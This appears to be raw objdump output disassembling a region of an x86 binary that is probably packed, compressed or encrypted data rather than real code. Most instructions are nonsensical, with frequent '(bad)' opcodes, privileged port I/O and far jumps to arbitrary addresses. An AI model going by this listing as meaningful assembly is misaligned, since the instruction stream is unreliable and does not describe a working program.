  41858e:	bound  edx,QWORD PTR [esi]
  418590:	push   0x1bce72
  418595:	rol    DWORD PTR [eax],0x72
  418598:	std    
  418599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41859a:	jbe    0x4185a2
  41859c:	jne    0x418569
  41859e:	(bad)  
  41859f:	fnstcw WORD PTR [ebx-0x6f]
  4185a2:	dec    ebp
  4185a3:	push   eax
  4185a4:	push   ss
  4185a5:	add    ecx,DWORD PTR [edx+0x2b]
  4185a8:	std    
  4185a9:	add    BYTE PTR [edx-0x32],bl
  4185ac:	in     eax,0x38
  4185ae:	jo     0x41862f
  4185b0:	dec    BYTE PTR [ebx]
  4185b2:	xchg   edi,eax
  4185b3:	test   BYTE PTR [esi],0xc7
  4185b6:	sbb    dh,BYTE PTR [ebx-0x3]
  4185b9:	jmp    DWORD PTR [edi]
  4185bb:	pop    edx
  4185bc:	call   0xfec0b782
  4185c1:	mov    ebx,edx
  4185c3:	jge    0x41858d
  4185c5:	ret    0x5a1f
  4185c8:	push   ebx
  4185c9:	mov    esi,DWORD PTR [ebx-0x55]
  4185cc:	dec    ebp
  4185cd:	pop    eax
  4185ce:	out    dx,eax
  4185cf:	ja     0x4185c9
  4185d1:	inc    eax
  4185d2:	pop    ss
  4185d3:	jb     0x418644
  4185d5:	add    DWORD PTR [edi+edi*2+0x2a],edx
  4185d9:	(bad)  [eax]
  4185db:	cmc    
  4185dc:	add    eax,0xfe7ea6e8
  4185e1:	(bad)  
  4185e2:	fcomp  QWORD PTR [ecx]
  4185e4:	push   cs
  4185e5:	test   BYTE PTR [ecx+0x5a],ch
	...
  418614:	inc    eax
  418615:	cmc    
  418616:	add    eax,0xfd57c3e8
  41861b:	(bad)  
  41861c:	fcomp  QWORD PTR [ecx]
  41861e:	je     0x418625
  418620:	ds inc esp
  418622:	std    
  418623:	jmp    DWORD PTR [edi-0x6ff38b88]
  418629:	jecxz  0x418630
  41862b:	call   0x400024
  418630:	jo     0x418615
  418632:	add    eax,0xfd5bf6e8
  418637:	dec    DWORD PTR [ecx+ebx*1-0x1083fd8c]
  41863e:	(bad)  
  41863f:	jne    0x4185e0
  418641:	jno    0x418665
  418643:	sbb    al,0xa0
  418645:	jns    0x418651
  418647:	ror    BYTE PTR [edx+0x5d],0xe9
  41864b:	arpl   WORD PTR [esi],di
  41864d:	in     eax,dx
  41864e:	xchg   edi,eax
  41864f:	pop    es
  418650:	push   esi
  418651:	push   0xc859ff00
  418656:	inc    ecx
  418657:	je     0x418695
  418659:	jmp    0x7531ee15
  41865e:	ret    
  41865f:	inc    DWORD PTR [eax-0x32]
  418662:	or     eax,ebp
  418664:	repnz pop ebp
  418666:	and    esi,edi
  418668:	inc    ebp
  418669:	jb     0x418602
  41866b:	add    DWORD PTR ds:0x367422f1,edx
  418671:	sbb    bl,BYTE PTR [eax]
  418673:	sbb    bl,BYTE PTR [ecx]
  418675:	push   ds
  418676:	or     eax,0xc0
	...
  41869f:	add    BYTE PTR [eax],al
  4186a1:	add    BYTE PTR [ebx+0x9332eb0],cl
  4186a7:	or     BYTE PTR [edx],cl
  4186a9:	call   0xfe641d20
  4186ae:	inc    ebp
  4186af:	jb     0x418648
  4186b1:	add    ebp,esp
  4186b3:	pushf  
  4186b4:	and    dh,BYTE PTR [esi+esi*1+0x5a]
  4186b8:	sbb    DWORD PTR [ecx+eiz*8],edx
  4186bb:	push   ebp
  4186bc:	test   edi,esi
  4186be:	push   ds
  4186bf:	inc    ebp
  4186c0:	add    ebp,DWORD PTR [ebx]
  4186c2:	dec    cl
  4186c4:	inc    ecx
  4186c5:	jae    0x4186f4
  4186c7:	lar    eax,WORD PTR [eax]
  4186ca:	cs mov dl,0x96
  4186cd:	or     esi,ebp
  4186cf:	mov    bl,0x1
  4186d1:	add    BYTE PTR [esi],bh
  4186d3:	test   eax,0xb23dbb08
  4186d8:	add    DWORD PTR [eax],eax
  4186da:	mov    ch,0xf1
  4186dc:	mov    esi,0x1ca7cc8
  4186e1:	push   ebp
  4186e2:	lds    edx,FWORD PTR [esi+0x4b1657b1]
  4186e8:	sbb    edi,DWORD PTR [edi]
  4186ea:	or     dl,BYTE PTR ds:[eax+eax*1+0x22a65b7d]
  4186f2:	jmp    0xc9b3:0x41989e56
  4186f9:	and    ah,BYTE PTR [eax-0x3c]
  4186fc:	loop   0x418741
  4186fe:	shl    BYTE PTR [eax-0x7a],cl
  418701:	cwde   
  418702:	inc    ebp
  418703:	(bad)  
  418704:	hlt    
  418705:	or     eax,DWORD PTR [eax]
	...
  41872f:	add    BYTE PTR [esi+0x68],dl
  418732:	jbe    0x418756
  418734:	inc    eax
  418735:	push   eax
  418736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418737:	cwde   
  418738:	inc    esp
  418739:	(bad)  
  41873a:	fmul   QWORD PTR [edi]
  41873c:	xor    DWORD PTR [esi-0x11],ecx
  41873f:	sub    edi,DWORD PTR ds:0xf62256c4
  418745:	cwde   
  418746:	fild   WORD PTR [ebx]
  418748:	jae    0x41871a
  41874a:	push   ebx
  41874b:	xchg   ch,bh
  41874d:	mov    esi,0x2379ba9a
  418752:	mov    edi,0xe71b071d
  418757:	sbb    ebp,DWORD PTR [edi+0x5a]
  41875a:	sub    ah,BYTE PTR [edx]
  41875c:	and    al,0xa0
  41875e:	pmaxub mm7,QWORD PTR [esp+eax*8+0x16]
  418763:	dec    edx
  418764:	jp     0x41871d
  418766:	out    0x3,eax
  418768:	ds pop ebx
  41876a:	je     0x418734
  41876c:	in     eax,0x2a
  41876e:	rdmsr  
  418770:	sub    eax,0x4285f6c4
  418775:	mov    bh,0xe7
  418777:	cwde   
  418778:	push   ecx
  418779:	(bad)  
  41877a:	sub    al,0x30
  41877c:	add    DWORD PTR [ebx-0x3c570739],esi
  418782:	push   0xffffff9f
  418784:	xchg   ebp,eax
  418785:	pop    edx
  418786:	push   esp
  418787:	or     ecx,ebx
  418789:	sbb    eax,0xa999b4d3
  41878e:	shl    DWORD PTR [eax],cl
  418790:	mov    bh,dl
  418792:	add    BYTE PTR [eax+eax*1],dh
	...
  4187bd:	add    BYTE PTR [esi-0x3c],cl
  4187c0:	push   cs
  4187c1:	gs int3 
  4187c3:	ret    
  4187c4:	std    
  4187c5:	jmp    0x3a31a68a
  4187ca:	pop    ds
  4187cb:	dec    edi
  4187cc:	in     al,dx
  4187cd:	sbb    DWORD PTR [ecx-0x3c71023c],0xb0fbffcb
  4187d7:	add    al,0x63
  4187d9:	es jge 0x41879f
  4187dc:	jmp    0x3de3:0xe41ef710
  4187e3:	pop    ebx
  4187e4:	add    BYTE PTR [esi],ch
  4187e6:	stc    
  4187e7:	mov    edx,0x5b3de900
  4187ec:	mov    ebp,DWORD PTR [ebp+edx*2+0x69d4fd12]
  4187f3:	sub    eax,ebp
  4187f5:	aad    0xfb
  4187f7:	sar    ebp,0xf2
  4187fa:	jge    0x41884a
  4187fc:	adc    BYTE PTR [edx-0x5f],ch
  4187ff:	mov    edx,0xc24bb500
  418804:	jae    0x418817
  418806:	and    dh,BYTE PTR [ecx-0x5]
  418809:	push   ds
  41880a:	pop    ds
  41880b:	aad    0xd8
  41880d:	push   ss
  41880e:	leave  
  41880f:	mov    edx,0xc1d676e8
  418814:	std    
  418815:	repnz adc al,BYTE PTR [edi+0x13]
  418819:	push   0xffffffa9
  41881b:	mov    esi,0xc22e7d00
  418820:	dec    ebx
  418821:	add    eax,0x0
	...
  41884a:	add    BYTE PTR [eax],al
  41884c:	jmp    0xd7b3:0x3de911da
  418853:	icebp  
  418854:	cmp    eax,0x529ee95b
  418859:	pop    ebx
  41885a:	inc    ebp
  41885b:	imul   ebx,DWORD PTR [esi+0x7d0074c2],0x973f7d93
  418865:	jmp    0xb9b:0xeaac0b01
  41886c:	int3   
  41886d:	jmp    0xf044:0xd1776a0d
  418874:	daa    
  418875:	out    dx,eax
  418876:	mov    edx,0xe8571673
  41887b:	pop    ebp
  41887c:	jle    0x4188f9
  41887e:	(bad)  
  41887f:	call   DWORD PTR [edx+0x72]
  418882:	in     eax,0x50
  418884:	jae    0x418901
  418886:	dec    BYTE PTR [ebx-0x36a5646c]
  41888c:	in     al,0x8
  41888e:	mov    ebp,esp
  418890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418891:	sbb    bl,BYTE PTR [ebp+0x567b88fe]
  418897:	push   esi
  418898:	out    0x5,eax
  41889a:	data16 in al,dx
  41889c:	ins    BYTE PTR es:[edi],dx
  41889d:	sahf   
  41889e:	std    
  41889f:	not    ebp
  4188a1:	pop    esp
  4188a2:	sar    edi,0x88
  4188a5:	xor    DWORD PTR [esi+0x41],eax
  4188a8:	pop    ss
  4188a9:	fidivr WORD PTR [esi]
  4188ab:	add    BYTE PTR [eax],bl
  4188ad:	fcmove st,st(2)
  4188af:	add    DWORD PTR [eax],eax
	...
  4188d9:	add    bh,ah
  4188db:	pop    ebp
  4188dc:	mov    eax,DWORD PTR [ebp-0x183ad]
  4188e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188e3:	add    ah,dh
  4188e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188e6:	or     BYTE PTR [ebx-0x2],bh
  4188e9:	or     esp,DWORD PTR [edi]
  4188eb:	imul   eax,DWORD PTR [esp+eiz*4-0x7cffa22a],0xa
  4188f3:	push   0xfffffffb
  4188f5:	jmp    FWORD PTR [eax+0x30840d5c]
  4188fb:	pop    eax
  4188fc:	add    BYTE PTR [eax],al
  4188fe:	sbb    dl,ah
  418900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418901:	(bad)  
  418902:	ds test eax,0xe6994f1d
  418908:	sbb    ch,bh
  41890a:	xchg   ecx,eax
  41890b:	cwde   
  41890c:	sub    al,0x41
  41890e:	and    eax,0x882a1e01
  418913:	cmp    dl,BYTE PTR [edi-0x5d]
  418916:	js     0x418908
  418918:	sbb    eax,0xea229ea
  41891d:	mov    dh,0xc2
  41891f:	xchg   ecx,eax
  418920:	imul   edi,ebp,0x67b4e861
  418926:	jns    0x41898c
  418928:	ret    
  418929:	inc    edx
  41892b:	cs inc edx
  41892d:	std    
  41892e:	dec    ecx
  41892f:	inc    eax
  418930:	mov    ah,0xe7
  418932:	fnstcw WORD PTR [ebx-0x942ffff]
  418938:	adc    BYTE PTR [ebp-0x1e18b45],cl
	...
  418966:	add    BYTE PTR [eax],al
  418968:	sub    DWORD PTR [ebx],eax
  41896a:	pop    ds
  41896b:	mov    ah,0xda
  41896d:	sub    BYTE PTR ds:0xe45e26fe,bl
  418973:	(bad)  
  418974:	adc    DWORD PTR [edi+eax*4-0x5d],ecx
  418978:	or     BYTE PTR [edx-0x7742bae3],al
  41897e:	hlt    
  41897f:	jno    0x418983
  418981:	jb     0x4189da
  418983:	repz lock jns 0x4189a4
  418987:	out    0x14,eax
  418989:	enter  0xfe1e,0xf9
  41898d:	das    
  41898e:	pop    esp
  41898f:	std    
  418990:	fst    DWORD PTR [ecx+0x4]
  418993:	add    BYTE PTR [esi],bh
  418995:	mov    dl,0xa7
  418997:	add    DWORD PTR [ebx-0x3e02a3c9],edi
  41899d:	leave  
  41899e:	mov    cl,0xfe
  4189a0:	repz (bad) 
  4189a2:	sbb    edi,esi
  4189a4:	mov    cl,0x5b
  4189a6:	iret   
  4189a7:	(bad)  
  4189a8:	dec    ebp
  4189a9:	rcr    dh,0xa
  4189ac:	jle    0x4189fe
  4189ae:	imul   ebx,DWORD PTR [ebx],0xffffff99
  4189b1:	shl    bh,0x84
  4189b4:	rol    BYTE PTR [ebx],cl
  4189b6:	(bad)  
  4189b7:	push   ds
  4189b8:	mov    BYTE PTR [esi],cl
  4189ba:	and    DWORD PTR [esi+edi*1],eax
  4189bd:	push   eax
  4189be:	ins    BYTE PTR es:[edi],dx
  4189bf:	sub    edi,DWORD PTR [ecx-0x40]
  4189c2:	out    0x90,eax
  4189c4:	mov    edx,0x681ea5c4
  4189c9:	sub    ecx,DWORD PTR [edi]
  4189cb:	or     BYTE PTR [eax],al
	...
  4189f5:	add    BYTE PTR [edi],bh
  4189f7:	pop    ebx
  4189f8:	out    0x2b,eax
  4189fa:	inc    edi
  4189fb:	pop    eax
  4189fc:	out    0x3,eax
  4189fe:	inc    ebp
  4189ff:	fwait
  418a00:	test   BYTE PTR [edi+0x3e75b78],0x3
  418a07:	push   edi
  418a08:	call   0x6691c810
  418a0d:	inc    edi
  418a0e:	xor    eax,eax
  418a10:	out    0x2b,eax
  418a12:	int    0x57
  418a14:	out    0x3,eax
  418a16:	mov    ?,WORD PTR [ebx]
  418a18:	das    
  418a19:	xchg   edx,eax
  418a1a:	jle    0x418a77
  418a1c:	pop    esp
  418a1d:	mov    bh,bh
  418a1f:	rol    BYTE PTR [esi+0x1e],0x79
  418a23:	mov    bl,0x31
  418a25:	push   es
  418a26:	ds pop ebx
  418a28:	push   0x47
  418a2a:	inc    ebp
  418a2b:	xor    eax,0xc3ba90e7
  418a30:	and    eax,0xf2ae81e
  418a35:	cmp    BYTE PTR [ebx],bh
  418a37:	pop    ebx
  418a38:	out    0x90,eax
  418a3a:	ret    0xdc3
  418a3d:	push   ds
  418a3e:	shr    BYTE PTR [edx],1
  418a40:	mov    cr4,ebx
  418a43:	sar    dh,0x9
  418a46:	inc    BYTE PTR [ebp+0x0]
  418a49:	leave  
  418a4a:	in     eax,0xe0
  418a4c:	dec    eax
  418a4d:	test   al,0x3d
  418a4f:	into   
  418a50:	and    edx,0x48
  418a53:	sar    ebp,0x39
  418a56:	push   edx
  418a57:	pop    edi
  418a58:	sbb    eax,0xd6
	...
  418a81:	add    BYTE PTR [eax],al
  418a83:	add    BYTE PTR [ebx],bh
  418a85:	iret   
  418a86:	xchg   ebx,eax
  418a87:	stos   DWORD PTR es:[edi],eax
  418a88:	xor    cl,al
  418a8a:	std    
  418a8b:	sbb    edx,edx
  418a8d:	mov    bh,0x64
  418a8f:	fisub  WORD PTR [edx]
  418a91:	shr    ecx,0xda
  418a94:	enter  0xc2d6,0xaf
  418a98:	push   ebx
  418a99:	rcl    DWORD PTR [eax+0x74],0xc1
  418a9d:	(bad)  
  418a9e:	(bad)  
  418a9f:	sahf   
  418aa0:	inc    ebx
  418aa1:	adc    al,ch
  418aa3:	xchg   edx,eax
  418aa4:	pop    eax
  418aa5:	sar    ch,0x60
  418aa8:	mov    ecx,0x2b86ff03
  418aad:	shl    DWORD PTR [ebx-0x23edfc3],0x76
  418ab4:	xchg   ecx,eax
  418ab5:	retf   0x6efe
  418ab8:	push   ebx
  418ab9:	mov    dh,0xf0
  418abb:	dec    DWORD PTR [edx-0x43]
  418abe:	or     DWORD PTR [ecx],ebp
  418ac0:	(bad)  
  418ac1:	mov    DWORD PTR [eax+0x4d],ebp
  418ac4:	scas   eax,DWORD PTR es:[edi]
  418ac5:	sbb    eax,DWORD PTR [eax]
  418ac7:	inc    ecx
  418ac8:	inc    ecx
  418ac9:	push   ebp
  418aca:	add    cl,ch
  418acc:	int    0x36
  418ace:	in     al,0xba
  418ad0:	cld    
  418ad1:	mov    esi,0xc0667cfe
  418ad6:	std    
  418ad7:	cs and dh,ah
  418ada:	and    eax,0xff344b26
  418adf:	xchg   edx,eax
  418ae0:	cmp    eax,0x71160031
  418ae5:	add    bh,bh
  418ae7:	push   cs
	...
  418b10:	add    BYTE PTR [eax],al
  418b12:	xor    esi,DWORD PTR [esi]
  418b14:	mov    esi,0xfd998f00
  418b19:	imul   edx,edi,0xa7076d72
  418b1f:	pop    edx
  418b20:	std    
  418b21:	mov    ch,0x63
  418b23:	pop    ebp
  418b24:	(bad)  
  418b25:	dec    DWORD PTR [edi-0x7f00e6a5]
  418b2b:	pop    edi
  418b2c:	mov    ah,0xa4
  418b2e:	jno    0x418b8f
  418b30:	(bad)  
  418b31:	call   0x404fa5
  418b36:	and    BYTE PTR ds:0x5fc0fef1,0xe5
  418b3d:	ins    BYTE PTR es:[edi],dx
  418b3e:	xchg   ebp,eax
  418b3f:	pop    edi
  418b40:	(bad)  
  418b41:	cld    
  418b42:	je     0x418b5e
  418b44:	mov    eax,0xfe5fa0ff
  418b49:	repnz icebp 
  418b4b:	mov    eax,ds:0xa4ea0f06
  418b50:	sti    
  418b51:	inc    eax
  418b53:	add    BYTE PTR [edi-0x37],bl
  418b56:	xchg   esp,eax
  418b57:	add    eax,0x15d4ec8b
  418b5c:	in     eax,dx
  418b5d:	push   eax
  418b5e:	dec    edi
  418b5f:	out    dx,eax
  418b60:	(bad)  
  418b62:	addr16 push edi
  418b64:	clc    
  418b65:	jb     0x418b7d
  418b67:	sbb    edi,esi
  418b69:	mov    esp,DWORD PTR [ebp+0x4a]
  418b6c:	gs add eax,0xe8005a26
  418b72:	xor    ah,al
  418b74:	(bad)  
  418b75:	inc    DWORD PTR [eax]
	...
  418b9f:	add    BYTE PTR [edi-0x2d],ah
  418ba2:	iret   
  418ba3:	nop
  418ba4:	mov    ss,WORD PTR [ebp-0x73a36f07]
  418baa:	lea    ebp,[eax-0x26]
  418bad:	pop    eax
  418bae:	add    BYTE PTR [eax],al
  418bb0:	dec    edi
  418bb1:	and    al,0x17
  418bb3:	inc    DWORD PTR [eax+0x4a]
  418bb6:	mov    dl,dl
  418bb8:	ds cmp eax,esi
  418bbb:	out    dx,eax
  418bbc:	scas   al,BYTE PTR es:[edi]
  418bbd:	fild   DWORD PTR [esi]
  418bbf:	add    DWORD PTR [esi],edi
  418bc1:	mov    ah,0x29
  418bc3:	test   al,0x24
  418bc5:	mov    ebp,0x238c8a19
  418bca:	mov    cl,dl
  418bcc:	(bad)  
  418bcd:	neg    BYTE PTR [ecx]
  418bcf:	mov    cl,BYTE PTR [eax+ecx*2-0x47e970ca]
  418bd6:	add    al,0x0
  418bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bda:	(bad)  
  418bdb:	sti    
  418bdc:	and    al,0xb4
  418bde:	sub    DWORD PTR [ebx+0x40],edx
  418be1:	mov    ah,0x1
  418be3:	nop
  418be4:	mov    ch,0xe1
  418be6:	(bad)  
  418be7:	sar    DWORD PTR [ecx+0x7e],1
  418bea:	adc    al,0x67
  418bec:	cmp    dh,BYTE PTR [ebx+0x3f560001]
  418bf2:	(bad)  
  418bf3:	(bad)  
  418bf4:	ds leave 
  418bf6:	inc    ecx
  418bf7:	jae    0x418c27
  418bf9:	cmp    DWORD PTR [esi],esi
  418bfb:	(bad)  
  418bfc:	out    0xe4,al
  418bfe:	xchg   ebp,eax
  418bff:	inc    eax
  418c00:	ds aad 0x8f
  418c03:	out    dx,eax
	...
  418c2c:	add    BYTE PTR [eax],al
  418c2e:	push   esi
  418c2f:	mov    edi,edi
  418c31:	(bad)  
  418c32:	cmp    DWORD PTR ds:[esi],esi
  418c35:	imul   edi,DWORD PTR [esi],0x3c6a0458
  418c3b:	test   al,0x1
  418c3d:	push   0x3d
  418c3f:	stos   BYTE PTR es:[edi],al
  418c40:	add    DWORD PTR [eax],eax
  418c42:	ds jb  0x418c5e
  418c45:	je     0x418c55
  418c47:	sbb    ecx,DWORD PTR [edi]
  418c49:	add    edi,DWORD PTR [esi]
  418c4b:	mov    dl,0x8c
  418c4d:	inc    esp
  418c4e:	or     dh,bl
  418c50:	push   cs
  418c51:	shl    BYTE PTR [ebx-0x12],0x1a
  418c55:	je     0x418c49
  418c57:	ins    DWORD PTR es:[edi],dx
  418c58:	(bad)  
  418c59:	out    dx,eax
  418c5a:	(bad)  
  418c5b:	pop    ebx
  418c5c:	inc    DWORD PTR [eax]
  418c5e:	ds pop ebx
  418c60:	xchg   ecx,eax
  418c61:	mov    bh,0x67
  418c63:	pop    ebx
  418c64:	push   ss
  418c65:	xchg   ecx,eax
  418c66:	loope  0x418c1b
  418c68:	jns    0x418c6c
  418c6a:	ds pop ebx
  418c6c:	repnz inc ebx
  418c6e:	dec    ebp
  418c6f:	dec    edi
  418c70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c71:	stos   DWORD PTR es:[edi],eax
  418c72:	mov    al,0x48
  418c74:	test   al,0x3
  418c76:	push   cs
  418c77:	mov    bl,0xeb
  418c79:	jmp    FWORD PTR [ecx+0x140451bc]
  418c7f:	pop    ebx
  418c80:	push   ecx
  418c81:	push   es
  418c82:	and    al,0x5b
  418c84:	inc    ecx
  418c85:	pop    es
  418c86:	es pop ebx
  418c88:	out    0x3,eax
  418c8a:	jle    0x418c48
  418c8c:	cmp    al,0x14
  418c8e:	cdq    
  418c8f:	in     al,dx
  418c90:	jecxz  0x418c95
	...
  418cba:	add    BYTE PTR [eax],al
  418cbc:	shr    BYTE PTR ds:[eax+edx*1],cl
  418cc0:	xor    DWORD PTR [edi+0x42],eax
  418cc3:	lods   al,BYTE PTR ds:[esi]
  418cc4:	imul   ecx,DWORD PTR [eax+0x28],0xe4045604
  418ccb:	add    edi,DWORD PTR [esi]
  418ccd:	sub    edi,edi
  418ccf:	add    ecx,edx
  418cd1:	sbb    edi,esp
  418cd3:	sbb    dl,dl
  418cd5:	(bad)  
  418cd6:	(bad)  
  418cd7:	fsubr  DWORD PTR [edx]
  418cd9:	mov    esp,0x4638b37e
  418cde:	jnp    0x418d0b
  418ce0:	int    0x56
  418ce2:	out    0x3,eax
  418ce4:	xchg   BYTE PTR [eax+0x27],dl
  418ce7:	nop
  418ce8:	aas    
  418ce9:	mov    al,0xaa
  418ceb:	sbb    dl,BYTE PTR [edx-0x72384041]
  418cf1:	sbb    ah,bh
  418cf3:	sbb    dl,BYTE PTR [edx+0x3a484fc3]
  418cf9:	pop    ebx
  418cfa:	out    0x86,eax
  418cfc:	std    
  418cfd:	dec    esi
  418cfe:	add    cl,al
  418d00:	mov    ch,0x47
  418d02:	aas    
  418d03:	jmp    0xe9461f1d
  418d08:	cmp    eax,0xe395c050
  418d0d:	xor    esp,edi
  418d0f:	call   0x5882:0x14dbbfa
  418d16:	add    cl,ch
  418d18:	xor    BYTE PTR [ebx-0x4414258c],bl
  418d1e:	addr16 jmp 0x418d24
	...
  418d48:	add    BYTE PTR [eax],al
  418d4a:	push   esp
  418d4b:	inc    edi
  418d4c:	clc    
  418d4d:	out    dx,al
  418d4e:	mov    ecx,0x72a768ab
  418d53:	sbb    al,BYTE PTR [eax]
  418d55:	push   ebx
  418d56:	inc    edx
  418d57:	mov    esp,0xbfc1d6d0
  418d5c:	call   0xfdfe12b2
  418d61:	(bad)  
  418d62:	mov    cl,0xab
  418d64:	call   0xfdfe02a2
  418d69:	mov    dh,0xc1
  418d6b:	ret    
  418d6c:	call   0xfdfdf2b2
  418d71:	mov    al,0xfb
  418d73:	mov    DWORD PTR es:[ebp+0x3ae097c3],ecx
  418d7a:	mov    ah,BYTE PTR [ebx]
  418d7c:	push   0x7c271c
  418d81:	sub    DWORD PTR [eax-0x3c813ea6],0xfd224f77
  418d8b:	mov    edx,0xde34f5fd
  418d90:	cmp    esi,DWORD PTR [edx+esi*8-0x3716ffe5]
  418d97:	pop    edi
  418d98:	sub    DWORD PTR [ecx],ebp
  418d9a:	shl    DWORD PTR [ebx-0x4936d93f],cl
  418da0:	add    BYTE PTR [eax],al
  418da2:	pop    ss
  418da3:	pop    edi
  418da4:	add    bh,al
  418da6:	mov    ds:0xe7fffd56,al
  418dab:	pop    esi
  418dac:	lds    eax,FWORD PTR [ebp+0x0]
	...
  418dd7:	add    BYTE PTR [ebx],ch
  418dd9:	pop    edi
  418dda:	add    BYTE PTR [eax],al
  418ddc:	xlat   BYTE PTR ds:[ebx]
  418ddd:	sbb    eax,DWORD PTR [esp+esi*8-0x19]
  418de1:	pop    esi
  418de2:	add    BYTE PTR [eax],al
  418de4:	and    dl,bh
  418de6:	in     eax,dx
  418de7:	add    bh,dl
  418de9:	pop    esi
  418dea:	add    BYTE PTR [ebp-0x72b2b16e],cl
  418df0:	loop   0x418e5c
  418df2:	dec    ebp
  418df3:	(bad)  
  418df4:	loop   0x418d78
  418df6:	dec    ebp
  418df7:	push   0xffffff98
  418df9:	loope  0x418e3f
  418dfb:	cld    
  418dfc:	or     DWORD PTR [bx+si],eax
  418dff:	push   0xffffffa4
  418e01:	or     dh,bh
  418e03:	(bad)  
  418e04:	xchg   edx,eax
  418e05:	in     eax,dx
  418e06:	dec    edx
  418e07:	inc    ecx
  418e08:	xchg   edi,eax
  418e09:	in     eax,0x44
  418e0b:	call   0x1275f24
  418e10:	xor    esp,DWORD PTR [esi+0x7f]
  418e13:	jge    0x418e94
  418e15:	mov    ch,bh
  418e17:	call   DWORD PTR [edi-0x17]
  418e1a:	jno    0x418e1b
  418e1c:	inc    edx
  418e1d:	push   ebx
  418e1e:	mov    es,WORD PTR [ebp-0x61]
  418e21:	fistp  QWORD PTR [eax+edi*8+0x67]
  418e25:	jmp    0x3fea:0x571a8b57
  418e2c:	mov    eax,0x6e865cf
  418e31:	(bad)  
  418e34:	sahf   
  418e35:	stc    
  418e36:	(bad)  
  418e38:	in     al,0x85
  418e3a:	push   ss
  418e3b:	sub    DWORD PTR [eax],eax
	...
  418e65:	add    BYTE PTR [eax-0xc3ff5ad],bl
  418e6b:	mov    esi,0x283e4588
  418e70:	stos   DWORD PTR es:[edi],eax
  418e71:	or     edx,DWORD PTR [esi]
  418e73:	pop    ecx
  418e74:	stc    
  418e75:	inc    BYTE PTR [ecx]
  418e77:	and    DWORD PTR [esi+0xa03c9df],ecx
  418e7d:	jmp    FWORD PTR [ebx+0x28]
  418e80:	mov    BYTE PTR [edi],bh
  418e82:	inc    edx
  418e83:	mov    esi,ecx
  418e85:	mov    dl,0x6d
  418e87:	add    eax,DWORD PTR [edx]
  418e89:	(bad)  
  418e8a:	ds and eax,0xc47f7254
  418e90:	test   dl,al
  418e92:	push   edx
  418e93:	imul   eax,esi,0x25debdeb
  418e99:	push   DWORD PTR [edx]
  418e9b:	sbb    eax,0xb0b27418
  418ea0:	jmp    0x418eee
  418ea2:	cmc    
  418ea3:	add    al,BYTE PTR [edx]
  418ea5:	(bad)  
  418ea6:	sti    
  418ea7:	mov    edi,0xc43e0004
  418eac:	test   BYTE PTR [esi+eiz*4-0x63],bh
  418eb0:	add    al,0x0
  418eb2:	ds ud0 ebp,eax
  418eb6:	loop   0x418e58
  418eb8:	adc    eax,0x1876bdfe
  418ebd:	(bad)  
  418ebe:	in     eax,dx
  418ebf:	mov    edx,0x86a7416
  418ec4:	lock dec esp
  418ec6:	cmc    
  418ec7:	add    BYTE PTR [eax+edi*4],0x0
	...
  418ef3:	add    BYTE PTR [edi],bh
  418ef5:	les    eax,FWORD PTR [ecx]
  418ef7:	add    ch,dh
  418ef9:	cli    
  418efa:	inc    ecx
  418efb:	push   esp
  418efc:	mov    ch,0x37
  418efe:	add    ebx,0x4fad546a
  418f04:	xchg   esi,eax
  418f05:	dec    edx
  418f06:	scas   al,BYTE PTR es:[edi]
  418f07:	(bad)  
  418f08:	jle    0x418ecc
  418f0a:	sbb    DWORD PTR [ecx+0x3f],esi
  418f0d:	add    eax,0x5b638216
  418f12:	ins    BYTE PTR es:[edi],dx
  418f13:	retf   
  418f14:	jle    0x418f71
  418f16:	out    0x8f,eax
  418f18:	inc    esi
  418f19:	fcom   QWORD PTR [esi*2+0x3e71a74]
  418f20:	mov    esp,DWORD PTR [ecx+0x12]
  418f23:	inc    esp
  418f24:	cwde   
  418f25:	adc    al,0x30
  418f27:	inc    ebx
  418f28:	les    edx,FWORD PTR [esi+0x7a]
  418f2b:	xchg   ebx,eax
  418f2c:	jle    0x418f89
  418f2e:	inc    eax
  418f2f:	jne    0x418f6f
  418f31:	pop    ebx
  418f32:	out    0x2b,eax
  418f34:	lods   al,BYTE PTR ds:[esi]
  418f35:	sbb    BYTE PTR [esi],0x17
  418f38:	mov    esp,0x7e935e76
  418f3d:	pop    ebx
  418f3e:	out    0x8f,eax
  418f40:	sub    BYTE PTR [eax+0x6eb8ff7a],bh
  418f46:	ss xchg ebx,eax
  418f48:	(bad)  
  418f49:	pop    edx
  418f4a:	inc    DWORD PTR [edx+0xae75b3c]
  418f50:	jle    0x418f80
  418f52:	in     al,dx
  418f53:	sub    al,0x27
  418f55:	pop    edx
  418f56:	out    0x3,eax
	...
  418f80:	add    BYTE PTR [eax],al
  418f82:	jns    0x418fa2
  418f84:	rol    DWORD PTR [ebx],cl
  418f86:	ds pop ebx
  418f88:	out    0x88,eax
  418f8a:	cli    
  418f8b:	mov    dh,0x17
  418f8d:	stos   BYTE PTR es:[edi],al
  418f8e:	jns    0x418fd2
  418f90:	jmp    0x41a07bab
  418f95:	add    al,0x69
  418f97:	sub    al,0xe3
  418f99:	push   ss
  418f9a:	dec    edx
  418f9b:	retf   0xc532
  418f9e:	pop    ecx
  418f9f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  418fa1:	(bad)  
  418fa2:	cmp    al,dl
  418fa4:	pusha  
  418fa5:	add    edi,DWORD PTR [esi]
  418fa7:	pop    ebx
  418fa8:	mov    ss,WORD PTR [edx-0x21a03cc3]
  418fae:	cmp    BYTE PTR [eax-0x47d63f90],bh
  418fb4:	add    dl,bh
  418fb6:	sub    eax,eax
  418fb8:	popf   
  418fb9:	jmp    0x418ff8
  418fbb:	pop    ebx
  418fbc:	push   eax
  418fbd:	data16 scas al,BYTE PTR es:[edi]
  418fbf:	scas   eax,DWORD PTR es:[edi]
  418fc0:	push   eax
  418fc1:	pop    esi
  418fc2:	lods   al,BYTE PTR ds:[esi]
  418fc3:	pop    ebx
  418fc4:	push   0x5b42e9
  418fc9:	sar    DWORD PTR ds:0x25e9005f,0xce
  418fd0:	add    ecx,ebp
  418fd2:	cmp    eax,0xd4bdc064
  418fd7:	mov    al,ds:0x5b3d2d43
  418fdc:	add    cl,ch
